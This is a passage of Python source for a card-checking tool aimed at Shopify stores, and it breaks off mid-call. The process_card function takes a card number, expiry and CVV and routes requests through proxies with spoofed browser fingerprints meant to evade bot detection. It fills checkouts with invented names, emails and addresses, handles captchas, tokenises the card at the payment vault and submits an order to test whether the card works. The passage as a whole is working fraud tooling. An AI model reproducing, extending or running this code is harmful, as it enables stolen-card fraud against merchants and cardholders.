async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None

    # ✅ CRITICAL: Proxy validation — agar proxy required hai aur parse fail hua toh error return karo
    if proxy_str and not proxy:
        logger.error(f"[process_card] Proxy parse failed | Proxy: {proxy_str[:50]}")
        return False, f"Invalid proxy format: {proxy_str[:30]}", gateway, total_price, currency

    if not proxy:
        logger.warning(f"[process_card] No proxy provided for site: {site_url[:50]}")

    checkpoint_data = None
    running_total = "0.00"

    try:
        # 🎯 Dynamic Session Fingerprint: Unique per card session, consistent across all steps
        fp = SessionFingerprint.create_new()

        headers = {
            'User-Agent': fp['ua'],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': fp['lang'],
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': fp['sec_ch_ua'],
            'sec-ch-ua-mobile': fp['mobile'],
            'sec-ch-ua-platform': fp['platform']
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]

        firstName = address_info.get("firstName") or Utils.get_random_name()[0]
        lastName = address_info.get("lastName") or Utils.get_random_name()[1]

        email_domain = address_info.get("email_domain") or "gmail.com"
        email = f"{firstName.lower()}.{lastName.lower()}{random.randint(10, 999)}@{email_domain}"

        phone = address_info["phone"]
        street = address_info["address1"]
        address2 = address_info.get("address2") or ""
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']

        # 🚀 curl_cffi: Real Chrome TLS/JA3 fingerprint — Cloudflare/Akamai invisible
        impersonate_target = _pick_impersonate()

        async with CffiAsyncSession(impersonate=impersonate_target, timeout=TIMEOUT_CHECKOUT, verify=False) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript'
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)

            if cart_resp.status_code != 200:
                # Cart fail — try alternate variant from sites.json pool first, then fresh fetch
                fb_vid = get_fallback_variant_for_site(ourl, variant_id)
                if fb_vid:
                    variant_id = fb_vid
                    try:
                        cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
                    except Exception:
                        pass

                if cart_resp.status_code != 200:
                    try:
                        fresh_info = await fetch_products(ourl, proxy_str)
                        if isinstance(fresh_info, dict) and fresh_info.get('variant_id'):
                            variant_id = fresh_info['variant_id']
                            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
                    except Exception:
                        pass

            if cart_resp.status_code != 200:
                return False, f"Cart failed with status {cart_resp.status_code}", gateway, total_price, currency

            checkout_headers = {
                'User-Agent': fp['ua'],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': fp['lang'],
                'Origin': ourl,
                'Referer': f"{ourl}/cart",
                'sec-ch-ua': fp['sec_ch_ua'],
                'sec-ch-ua-mobile': fp['mobile'],
                'sec-ch-ua-platform': fp['platform'],
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
            }
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)

            if response.status_code not in (200, 302):
                if response.status_code == 429:
                    logger.warning(f"[/checkout] HTTP 429 on POST checkout ({ourl}) | Waiting 1.2s and retrying with GET...")
                    await asyncio.sleep(1.2)
                    response = await session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)

                if response.status_code not in (200, 302):
                    return False, f"Checkout page failed: HTTP {response.status_code}", gateway, total_price, currency

            checkout_url = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')

            text = response.text
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
                # JSON parse fallback — regex fail hone pe
                if not sst:
                    try:
                        _unesc = text.replace('&quot;', '"').replace('&#34;', '"')
                        _m = re.search(r'"sessionToken"\s*:\s*"([^"]{10,})"', _unesc)
                        if _m:
                            sst = _m.group(1)
                    except Exception:
                        pass

            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')

            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            currency = 'USD'
            for c_pat in (
                r'currencyCode&quot;:&quot;([A-Z]{3})&quot;',
                r'"currencyCode"\s*:\s*"([A-Z]{3})"',
                r'"presentmentCurrencyCode"\s*:\s*"([A-Z]{3})"',
                r'presentmentCurrencyCode&quot;:&quot;([A-Z]{3})&quot;',
                r'"currency"\s*:\s*"([A-Z]{3})"',
            ):
                c_m = re.search(c_pat, text)
                if c_m:
                    currency = c_m.group(1)
                    break

            # If store currency indicates a specific country, match address to store currency
            if currency and currency != 'USD':
                c_addr = pick_addr(ourl, cc=currency)
                if c_addr and c_addr.get('countryCode') != country_code:
                    address_info = c_addr
                    country_code = address_info["countryCode"]
                    firstName = address_info.get("firstName") or firstName
                    lastName = address_info.get("lastName") or lastName
                    street = address_info["address1"]
                    address2 = address_info.get("address2") or ""
                    city = address_info["city"]
                    state = address_info["zoneCode"]
                    s_zip = address_info["postalCode"]
                    phone = address_info["phone"]

            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # Extract build ID (commitSha), source token, and identification signature
            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')

            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            for i in range(2):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if is_captcha_required(resp_text):
                    break
                if i == 0:
                    await asyncio.sleep(0.2) # Let Shopify calculate taxes and shipping properly

            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency

                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency

                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency

                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency

                result_type = result.get('__typename', 'Unknown')

                if result_type == 'CheckpointDenied':
                    return False, f"Checkpoint Denied", gateway, total_price, currency

                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get('checkpointData')

                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency

                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')

                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency

                running_total = running_total_data['value']['amount']
                if running_total_data['value'].get('currencyCode'):
                    currency = running_total_data['value']['currencyCode']

                m_lines = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
                if m_lines and len(m_lines) > 0:
                    m_val = m_lines[0].get('totalAmount', {}).get('value', {})
                    if m_val and m_val.get('amount'):
                        subtotal = m_val['amount']
                        if m_val.get('currencyCode'):
                            currency = m_val['currencyCode']
                elif seller_proposal.get('subtotalBeforeTaxesAndShipping', {}).get('value', {}).get('amount'):
                    subtotal = seller_proposal['subtotalBeforeTaxesAndShipping']['value']['amount']
                elif seller_proposal.get('subtotalBeforeReductions', {}).get('value', {}).get('amount'):
                    subtotal = seller_proposal['subtotalBeforeReductions']['value']['amount']

            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency

            delivery_type = delivery_data.get('__typename', '')

            if delivery_type == 'PendingTerms':
                # Shopify abhi shipping calculate kar raha hai — pollDelay ke baad retry karo
                poll_delay_ms = delivery_data.get('pollDelay', 800)
                await asyncio.sleep(min(poll_delay_ms / 1000.0, 0.8))

                # Ek aur proposal bhejo — ab FilledDeliveryTerms milni chahiye
                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if response:
                    try:
                        retry_json = json.loads(resp_text)
                        retry_seller = retry_json.get('data', {}).get('session', {}) \
                                                  .get('negotiate', {}).get('result', {}) \
                                                  .get('sellerProposal', {})
                        if retry_seller:
                            delivery_data = retry_seller.get('delivery', delivery_data)
                            running_total_data = retry_seller.get('runningTotal', running_total_data)
                            if running_total_data and 'value' in running_total_data:
                                running_total = running_total_data['value'].get('amount', running_total)
                                if running_total_data['value'].get('currencyCode'):
                                    currency = running_total_data['value']['currencyCode']
                            seller_proposal = retry_seller
                    except (KeyError, TypeError, json.JSONDecodeError) as e:
                        # FIX 4: Specific exception handling
                        pass

                delivery_type = delivery_data.get('__typename', '') if delivery_data else ''

            if delivery_type == 'PendingTerms':
                # Ab bhi pending — blank strategy se aage badho
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        # 🎯 Select CHEAPEST / Free Shipping ($0.00 first) to keep order total low
                        def _strat_cost(st):
                            try:
                                return float(st.get('amount', {}).get('value', {}).get('amount', 999999))
                            except Exception:
                                return 999999.0

                        sorted_strategies = sorted(available_strategies, key=_strat_cost)
                        best_strategy = sorted_strategies[0]
                        delivery_strategy = best_strategy.get('handle', '')
                        shipping_amount = _strat_cost(best_strategy)
                        if shipping_amount >= 999999.0:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except (KeyError, TypeError, ValueError) as e:
                # FIX 4: Specific exception handling
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')

                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)

                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            if checkpoint_data:
                json_data['variables']['checkpointData'] = checkpoint_data

            json_data['variables']['delivery']['deliveryLines'][0]['destination'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy if delivery_strategy else '',
                    'customDeliveryRate': False
                },
                'options': {}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': f"{shipping_amount:.2f}", 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = f"{tax_amount:.2f}"
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
            )

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # Parse Proposal 2 to update the exact final total, taxes, and currency
            try:
                p2_json = json.loads(resp_text)
                p2_seller = p2_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                if p2_seller:
                    p2_running = p2_seller.get('runningTotal', {}).get('value', {})
                    if p2_running:
                        if p2_running.get('currencyCode'):
                            currency = p2_running['currencyCode']
                        if p2_running.get('amount'):
                            running_total = p2_running['amount']

                    p2_tot = p2_seller.get('total') or p2_seller.get('checkoutTotal')
                    if p2_tot and 'value' in p2_tot and p2_tot['value'].get('amount'):
                        running_total = p2_tot['value']['amount']
                        if p2_tot['value'].get('currencyCode'):
                            currency = p2_tot['value']['currencyCode']

                    p2_mlines = p2_seller.get('merchandise', {}).get('merchandiseLines', [])
                    if p2_mlines and len(p2_mlines) > 0:
                        p2_mval = p2_mlines[0].get('totalAmount', {}).get('value', {})
                        if p2_mval and p2_mval.get('amount'):
                            subtotal = p2_mval['amount']
                            if p2_mval.get('currencyCode'):
                                currency = p2_mval['currencyCode']
                    elif p2_seller.get('subtotalBeforeTaxesAndShipping', {}).get('value', {}).get('amount'):
                        subtotal = p2_seller['subtotalBeforeTaxesAndShipping']['value']['amount']

                    p2_tax = p2_seller.get('tax')
                    if p2_tax and p2_tax.get('__typename') == 'FilledTaxTerms':
                        tax_amount = float(p2_tax.get('totalTaxAmount', {}).get('value', {}).get('amount', tax_amount))

                    p2_res = p2_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                    if p2_res.get('checkpointData'):
                        checkpoint_data = p2_res['checkpointData']

                total_price = running_total
            except Exception as e:
                pass

            # Ensure Year is always 4 digits for PCI Vault
            ano_int = int(ano)
            if ano_int < 100:
                ano_int += 2000

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": ano_int,
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }

            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': fp['lang'],
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': fp['ua'],
                'sec-ch-ua': fp['sec_ch_ua'],
                'sec-ch-ua-mobile': fp['mobile'],
                'sec-ch-ua-platform': fp['platform'],
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig

            vault_timeout = TIMEOUT_VAULT
            token = None
            for v_attempt in range(3):
                try:
                    response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=vault_timeout)
                    if response.status_code == 200:
                        token_data = response.json()
                        token = token_data.get('id')
                        if token:
                            break
                except Exception:
                    pass
                await asyncio.sleep(0.1)

            if not token:
                return False, 'Unable to get payment token (Vault Error)', gateway, total_price, currency

            # Ensure payment amount is strictly positive (Shopify payment gateways reject 0.00 with PAYMENTS_POSITIVE_AMOUNT_EXPECTED)
            try:
                if float(running_total) <= 0.0:
                    if float(subtotal) > 0.0:
                        running_total = f"{float(subtotal) + shipping_amount + tax_amount:.2f}"
            except Exception:
                pass

            try:
                if float(running_total) <= 0.0:
                    logger.warning(f"[process_card] Total is $0.00 (Free item) on {ourl}. Gateways require > 0.00. Rotating to alternate variant...")
                    fb_vid = get_fallback_variant_for_site(ourl, variant_id)
                    if fb_vid and fb_vid != variant_id:
                        return await process_card(cc, mes, ano, cvv, site_url, fb_vid, proxy_str)
                    fresh_info = await fetch_products(ourl, proxy_str)
                    if isinstance(fresh_info, dict) and fresh_info.get('variant_id') and fresh_info.get('variant_id') != variant_id:
                        return await process_card(cc, mes, ano, cvv, site_url, fresh_info['variant_id'], proxy_str)
                    return False, "PAYMENTS_POSITIVE_AMOUNT_EXPECTED: Free item ($0.00) cannot be processed by payment gateway", gateway, total_price, currency
            except Exception:
                pass

            params = {'operationName': 'SubmitForCompletion'}

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy if delivery_strategy else '',
                                    'customDeliveryRate': False
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': f"{shipping_amount:.2f}", 'currencyCode': currency}
                            },
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': f"{float(running_total):.2f}", 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': f"{tax_amount:.2f}", 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }

            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            if "Your order total has changed." in text or "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in text:
                # Auto-sync latest order total and merchandise price from Shopify and retry submit once
                try:
                    logger.info(f"[process_card] Total/Price mismatch detected in submit. Syncing from Shopify...")
                    new_amt = None
                    new_cur = currency

                    # Direct extraction from submit response text if available
                    amt_m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', text) or \
                            re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', text) or \
                            re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', text)
                    if amt_m:
                        new_amt = amt_m.group(1)

                    cp_m = re.search(r'"checkpointData"\s*:\s*"([^"]+)"', text)
                    if cp_m:
                        checkpoint_data = cp_m.group(1)

                    # If not in text, query Proposal with operationName='Proposal'
                    if not new_amt:
                        sync_params = {'operationName': 'Proposal'}
                        sync_vars = json_data['variables'].copy()
                        if checkpoint_data:
                            sync_vars['checkpointData'] = checkpoint_data

                        sync_payload = {
                            'query': QUERY_PROPOSAL_DELIVERY,
                            'variables': sync_vars,
                            'operationName': 'Proposal'
                        }
                        s_resp, s_text, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, sync_params, headers, sync_payload, checkout_url, max_retries=1, proxy=proxy
                        )
                        if s_resp and s_text:
                            try:
                                s_json = json.loads(s_text)
                                s_res = s_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                                s_seller = s_res.get('sellerProposal', {})
                                s_tot = s_seller.get('total') or s_seller.get('checkoutTotal') or s_seller.get('runningTotal')
                                if s_tot and 'value' in s_tot and s_tot['value'].get('amount'):
                                    new_amt = s_tot['value']['amount']
                                    new_cur = s_tot['value'].get('currencyCode', currency)
                                if s_res.get('checkpointData'):
                                    checkpoint_data = s_res['checkpointData']
                            except Exception:
                                pass

                            if not new_amt:
                                s_amt_m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', s_text) or \
                                          re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([\d.]+)"', s_text)
                                if s_amt_m:
                                    new_amt = s_amt_m.group(1)

                    if new_amt:
                        logger.info(f"[process_card] Order total synced to: {new_amt} {new_cur}. Retrying submit...")
                        submit_variables['input']['purchaseProposal']['payment']['paymentLines'][0]['amount']['value'] = {
                            'amount': str(new_amt),
                            'currencyCode': new_cur
                        }
                        total_price = str(new_amt)
                        currency = new_cur
                        if checkpoint_data:
                            submit_variables['input']['checkpointData'] = checkpoint_data

                        submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {'any': True}
                        submit_json_data['variables'] = submit_variables
                        submit_params = {'operationName': 'SubmitForCompletion'}
                        response, text, _ = await make_graphql_request_with_captcha_handling(
